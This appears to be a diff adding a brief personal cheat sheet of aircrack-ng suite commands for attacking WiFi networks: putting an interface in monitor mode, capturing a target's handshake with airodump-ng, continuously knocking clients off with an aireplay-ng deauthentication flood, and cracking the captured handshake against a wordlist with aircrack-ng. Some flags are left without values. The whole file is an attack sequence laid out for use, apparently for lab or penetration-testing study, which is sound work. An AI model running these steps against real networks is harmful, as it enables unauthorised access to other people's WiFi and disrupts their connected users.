@@ -1,0 +1,12 @@
+# iwconfig  
+airmon-ng start wlan0                                 : to enable  monitor mode 
+iwconfig
+airodump-ng wlan0 
+airodump-ng -c -d bssid -w /home/kali/ wlan0          : -c for channel 
+                                                        -d for bssid 
+                                                        -w for path  
+aireplay-ng --deauth 0 -a bssid -c station wlan0      : -a for bssid 
+                                                        -c for station 
+airmon-ng stop wlan0                                  : to disable monitor mode
+iwconfig                                              
+aircrack-ng  wifecap-02  -w                           : -w for path for password
